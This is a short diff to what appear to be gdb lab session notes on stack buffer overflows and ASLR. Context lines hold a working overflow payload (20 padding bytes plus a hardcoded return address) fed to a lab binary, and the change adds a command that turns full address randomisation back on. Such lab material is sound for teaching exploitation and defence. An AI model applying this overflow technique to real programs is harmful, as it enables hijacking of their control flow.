@@ -34,6 +34,7 @@ python3 -c "import subprocess; payload = b'a'*20 + b'\x76\x91\x04\x08'; subproce
 ./flow.out $'aaaaaaaaaaaaaaaaaaaa\x76\x91\x04\x08'
 
 aslr.c
+sudo sysctl -w kernel.randomize_va_space=2
 * gdb-lab/sess2$ ./aslr.out
 address of x (on stack):0xff9488f8
 address of y (on heap):0x8fc4010
